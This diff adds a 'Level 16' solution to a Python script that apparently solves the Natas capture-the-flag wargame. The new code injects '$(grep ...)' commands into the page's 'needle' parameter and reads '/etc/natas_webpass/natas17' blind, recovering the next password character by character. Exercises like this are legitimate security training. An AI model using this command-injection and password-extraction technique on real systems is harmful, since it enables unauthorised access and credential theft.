@@ -348,5 +348,51 @@ try:
 except requests.exceptions.RequestException as e:
   print(f"HTTP Request failed: {e}")
 
+# Level 16
+try:
+  passfile17 = '/etc/natas_webpass/natas17'
+  prefix = 'tested'
+  def get_password_chars():
+    filtered = ''
+    chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+    print('Looking for password char set...')
+    for char in chars:
+      input_text = f'^{prefix}$(grep {char} {passfile17})'
+      if is_hit(input_text):
+        filtered += char
+        print(f'The password contains: {filtered}')
+    return filtered
+
+  def get_password(filtered):
+    password = ''
+    for i in range(32):
+      print(f'Looking for the position {i}...')
+      for char in filtered:
+        input_text = f'^{prefix}$(grep ^{password}{char} {passfile17})'
+        if is_hit(input_text):
+          password += char
+          print(password) 
+          break
+    return password
+
+  def is_hit(data):
+    url = url_dict["natas16"]
+    s = requests.Session()
+    params = {
+      'needle':data
+    }
+    resp = s.get(url,params=params,auth=cred_dict["natas16"])
+    resp.raise_for_status()
+    return resp and prefix not in resp.text
+
+  print("\nLevel 16")
+  print("Finding out which characters the password contains...")
+  password_chars = get_password_chars()
+  password = get_password(password_chars)
+  print(f'The password is: {password}')
+  cred_dict["natas17"] = ("natas17",password)
+
+except requests.exceptions.RequestException as e:
+  print(f"HTTP Request failed: {e}")
 
 print(cred_dict)
